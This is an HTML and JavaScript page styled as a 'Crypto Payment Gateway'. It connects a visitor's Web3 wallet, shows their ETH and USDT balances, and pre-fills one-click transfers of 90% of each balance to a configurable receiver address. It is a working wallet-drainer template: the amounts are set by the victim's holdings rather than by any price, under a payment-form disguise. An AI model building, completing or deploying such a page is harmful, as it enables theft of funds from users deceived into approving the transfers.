<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>ETH / USDT Payment</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.umd.min.js"></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #0d1117;
            color: #fff;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .container {
            background: #161b22;
            padding: 30px;
            border-radius: 12px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
            border: 1px solid #30363d;
        }
        
        h2 {
            margin-top: 0;
            color: #58a6ff;
            text-align: center;
            border-bottom: 2px solid #30363d;
            padding-bottom: 15px;
            margin-bottom: 20px;
        }
        
        .balance-display {
            background: #0d1117;
            padding: 15px;
            border-radius: 8px;
            margin: 15px 0;
            border: 1px solid #30363d;
        }
        
        .balance-item {
            display: flex;
            justify-content: space-between;
            margin: 8px 0;
            font-size: 14px;
        }
        
        .balance-label {
            color: #8b949e;
        }
        
        .balance-value {
            color: #fff;
            font-weight: bold;
        }
        
        .wallet-address {
            background: #0d1117;
            padding: 12px;
            border-radius: 8px;
            margin: 15px 0;
            text-align: center;
            font-family: monospace;
            font-size: 14px;
            border: 1px solid #30363d;
            word-break: break-all;
            color: #58a6ff;
        }
        
        button {
            padding: 14px;
            margin-top: 10px;
            width: 100%;
            font-size: 16px;
            background: #238636;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
            transition: all 0.3s ease;
        }
        
        button:hover {
            background: #2ea043;
            transform: translateY(-1px);
        }
        
        button:active {
            transform: translateY(0);
        }
        
        button:disabled {
            background: #30363d;
            cursor: not-allowed;
            transform: none;
        }
        
        .connect-btn {
            background: #1f6feb;
            margin-bottom: 20px;
        }
        
        .connect-btn:hover {
            background: #2a7ae9;
        }
        
        .eth-btn {
            background: #6c8eef;
        }
        
        .eth-btn:hover {
            background: #7d9ef5;
        }
        
        .usdt-btn {
            background: #26a17b;
        }
        
        .usdt-btn:hover {
            background: #2db48a;
        }
        
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 6px;
            font-size: 14px;
            text-align: center;
            min-height: 20px;
        }
        
        .status-success {
            background: rgba(35, 134, 54, 0.2);
            color: #2ea043;
            border: 1px solid #238636;
        }
        
        .status-pending {
            background: rgba(158, 136, 33, 0.2);
            color: #e3b341;
            border: 1px solid #bb8009;
        }
        
        .status-error {
            background: rgba(248, 81, 73, 0.2);
            color: #f85149;
            border: 1px solid #da3633;
        }
        
        .divider {
            height: 1px;
            background: #30363d;
            margin: 25px 0;
        }
        
        .amount-input {
            margin: 20px 0;
        }
        
        .amount-label {
            display: block;
            margin-bottom: 8px;
            color: #8b949e;
            font-size: 14px;
        }
        
        input[type="number"] {
            width: 100%;
            padding: 12px;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 6px;
            color: #fff;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        input[type="number"]:focus {
            outline: none;
            border-color: #1f6feb;
        }
        
        .amount-info {
            font-size: 12px;
            color: #8b949e;
            margin-top: 5px;
            text-align: right;
        }
        
        .tx-hash {
            font-family: monospace;
            font-size: 12px;
            word-break: break-all;
            margin-top: 10px;
            color: #58a6ff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Crypto Payment Gateway</h2>
        
        <!-- Connect Wallet Section -->
        <button class="connect-btn" onclick="connectWallet()" id="connectBtn">
            Connect Wallet
        </button>
        
        <!-- Wallet Address Display -->
        <div class="wallet-address" id="walletAddress" style="display: none;">
            Not connected
        </div>
        
        <!-- Balance Display -->
        <div class="balance-display" id="balanceDisplay" style="display: none;">
            <div class="balance-item">
                <span class="balance-label">ETH Balance:</span>
                <span class="balance-value" id="ethBalance">0.0000</span>
            </div>
            <div class="balance-item">
                <span class="balance-label">USDT Balance:</span>
                <span class="balance-value" id="usdtBalance">0.00</span>
            </div>
        </div>
        
        <div class="divider" id="divider" style="display: none;"></div>
        
        <!-- ETH Transfer Section -->
        <div id="transferSection" style="display: none;">
            <div class="amount-input">
                <label class="amount-label">ETH Amount to Send (90% of balance):</label>
                <input type="number" id="ethAmount" step="0.0001" min="0" placeholder="0.0000">
                <div class="amount-info">Based on 90% of your current ETH balance</div>
            </div>
            
            <button class="eth-btn" onclick="sendEth()" id="sendEthBtn">
                Send 90% ETH
            </button>
            
            <div class="divider"></div>
            
            <!-- USDT Transfer Section -->
            <button class="usdt-btn" onclick="sendUSDT()" id="sendUsdtBtn">
                Send 90% USDT
            </button>
        </div>
        
        <!-- Status Display -->
        <div class="status" id="status">
            Ready to connect
        </div>
    </div>

    <script>
        // Configuration
        const RECEIVER = "0xYOUR_RECEIVER_ADDRESS_HERE"; // Replace with your receiver address
        const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // Mainnet USDT
        
        // USDT Contract ABI (minimal for balance and transfer)
        const USDT_ABI = [
            "function balanceOf(address owner) view returns (uint256)",
            "function decimals() view returns (uint8)",
            "function transfer(address to, uint256 amount) returns (bool)"
        ];
        
        // Global variables
        let provider = null;
        let signer = null;
        let userAddress = null;
        let ethBalance = null;
        let usdtBalance = null;
        let usdtDecimals = null;
        
        // Connect wallet function
        async function connectWallet() {
            try {
                // Check if MetaMask/Web3 wallet is available
                if (!window.ethereum) {
                    updateStatus("Please install MetaMask or a Web3 wallet", "error");
                    return;
                }
                
                updateStatus("Connecting to wallet...", "pending");
                
                // Create provider and request account access
                provider = new ethers.BrowserProvider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                
                // Get signer and user address
                signer = await provider.getSigner();
                userAddress = await signer.getAddress();
                
                // Update UI with wallet info
                document.getElementById("walletAddress").textContent = 
                    `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                document.getElementById("walletAddress").style.display = "block";
                
                // Load balances
                await loadBalances();
                
                // Show balance display and transfer section
                document.getElementById("balanceDisplay").style.display = "block";
                document.getElementById("transferSection").style.display = "block";
                document.getElementById("divider").style.display = "block";
                
                // Update button text
                document.getElementById("connectBtn").textContent = "Wallet Connected";
                document.getElementById("connectBtn").disabled = true;
                
                updateStatus("Wallet connected successfully", "success");
                
            } catch (error) {
                console.error("Connection error:", error);
                updateStatus("Failed to connect wallet: " + error.message, "error");
            }
        }
        
        // Load ETH and USDT balances
        async function loadBalances() {
            try {
                updateStatus("Loading balances...", "pending");
                
                // Get ETH balance
                ethBalance = await provider.getBalance(userAddress);
                const ethBalanceFormatted = ethers.formatEther(ethBalance);
                
                // Calculate 90% of ETH balance for default send amount
                const ethToSend = (parseFloat(ethBalanceFormatted) * 0.9).toFixed(6);
                
                // Update ETH balance display
                document.getElementById("ethBalance").textContent = 
                    `${parseFloat(ethBalanceFormatted).toFixed(4)} ETH`;
                
                // Set default send amount (90% of balance)
                document.getElementById("ethAmount").value = ethToSend;
                
                // Get USDT balance
                const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
                usdtDecimals = await usdtContract.decimals();
                usdtBalance = await usdtContract.balanceOf(userAddress);
                const usdtBalanceFormatted = ethers.formatUnits(usdtBalance, usdtDecimals);
                
                // Update USDT balance display
                document.getElementById("usdtBalance").textContent = 
                    `${parseFloat(usdtBalanceFormatted).toFixed(2)} USDT`;
                
                updateStatus("Balances loaded", "success");
                
            } catch (error) {
                console.error("Balance load error:", error);
                updateStatus("Failed to load balances", "error");
            }
        }
        
        // Send ETH function
        async function sendEth() {
            try {
                // Get amount from input
                const amount = document.getElementById("ethAmount").value;
                
                // Validate amount
                if (!amount || amount <= 0) {
                    updateStatus("Please enter a valid ETH amount", "error");
                    return;
                }
                
                // Check if user has enough ETH (including gas)
                const amountWei = ethers.parseEther(amount);
                const balanceWei = ethers.parseEther(ethers.formatEther(ethBalance));
                
                if (amountWei > balanceWei) {
                    updateStatus("Insufficient ETH balance", "error");
                    return;
                }
                
                updateStatus("Please confirm transaction in your wallet...", "pending");
                
                // Disable buttons during transaction
                document.getElementById("sendEthBtn").disabled = true;
                document.getElementById("sendUsdtBtn").disabled = true;
                
                // Send transaction
                const tx = await signer.sendTransaction({
                    to: RECEIVER,
                    value: amountWei
                });
                
                updateStatus(`Transaction submitted: ${tx.hash}`, "pending");
                
                // Wait for transaction confirmation
                const receipt = await tx.wait();
                
                if (receipt.status === 1) {
                    updateStatus(`✅ ETH sent successfully! Hash: ${tx.hash}`, "success");
                    // Reload balances after successful transfer
                    await loadBalances();
                } else {
                    updateStatus("Transaction failed", "error");
                }
                
            } catch (error) {
                console.error("ETH send error:", error);
                
                if (error.code === 4001) {
                    updateStatus("Transaction rejected by user", "error");
                } else {
                    updateStatus("Transaction failed: " + error.message, "error");
                }
                
            } finally {
                // Re-enable buttons
                document.getElementById("sendEthBtn").disabled = false;
                document.getElementById("sendUsdtBtn").disabled = false;
            }
        }
        
        // Send USDT function
        async function sendUSDT() {
            try {
                // Validate USDT balance
                if (!usdtBalance || usdtBalance == 0) {
                    updateStatus("No USDT balance to send", "error");
                    return;
                }
                
                updateStatus("Please confirm USDT transfer in your wallet...", "pending");
                
                // Disable buttons during transaction
                document.getElementById("sendEthBtn").disabled = true;
                document.getElementById("sendUsdtBtn").disabled = true;
                
                // Calculate 90% of USDT balance
                const sendAmount = usdtBalance * 90n / 100n;
                
                // Create contract with signer for sending
                const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
                
                // Send USDT transfer
                const tx = await usdtContract.transfer(RECEIVER, sendAmount);
                
                updateStatus(`USDT transfer submitted: ${tx.hash}`, "pending");
                
                // Wait for transaction confirmation
                const receipt = await tx.wait();
                
                if (receipt.status === 1) {
                    updateStatus(`✅ USDT sent successfully! Hash: ${tx.hash}`, "success");
                    // Reload balances after successful transfer
                    await loadBalances();
                } else {
                    updateStatus("USDT transfer failed", "error");
                }
                
            } catch (error) {
                console.error("USDT send error:", error);
                
                if (error.code === 4001) {
                    updateStatus("Transaction rejected by user", "error");
                } else {
                    updateStatus("USDT transfer failed: " + error.message, "error");
                }
                
            } finally {
                // Re-enable buttons
                document.getElementById("sendEthBtn").disabled = false;
                document.getElementById("sendUsdtBtn").disabled = false;
            }
        }
        
        // Update status message
        function updateStatus(message, type = "info") {
            const statusElement = document.getElementById("status");
            statusElement.textContent = message;
            
            // Remove existing classes
            statusElement.className = "status";
            
            // Add appropriate class based on type
            if (type === "success") {
                statusElement.classList.add("status-success");
            } else if (type === "pending") {
                statusElement.classList.add("status-pending");
            } else if (type === "error") {
                statusElement.classList.add("status-error");
            }
        }
        
        // Optional: Listen for account changes
        if (window.ethereum) {
            window.ethereum.on('accountsChanged', function(accounts) {
                if (accounts.length === 0) {
                    // User disconnected wallet
                    location.reload();
                } else {
                    // User switched accounts
                    location.reload();
                }
            });
            
            window.ethereum.on('chainChanged', function() {
                // Network changed, reload the page
                location.reload();
            });
        }
    </script>
</body>
</html>
